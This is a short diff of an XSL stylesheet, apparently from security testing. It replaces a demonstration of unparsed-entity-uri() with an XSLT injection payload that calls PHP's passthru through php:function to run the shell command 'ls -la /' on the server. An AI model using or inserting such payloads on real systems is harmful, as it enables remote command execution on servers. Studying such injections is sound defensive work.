@@ -7,8 +7,7 @@
 			<h3>unparsed-entity-uri()</h3>
 			<ul>
 				<li>
-					<b>unparsed-entity-uri('currentpath')</b> = 
-					<xsl:value-of select="unparsed-entity-uri('currentpath')"/>
+					<xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>
 				</li>
 			</ul>
 		</body>
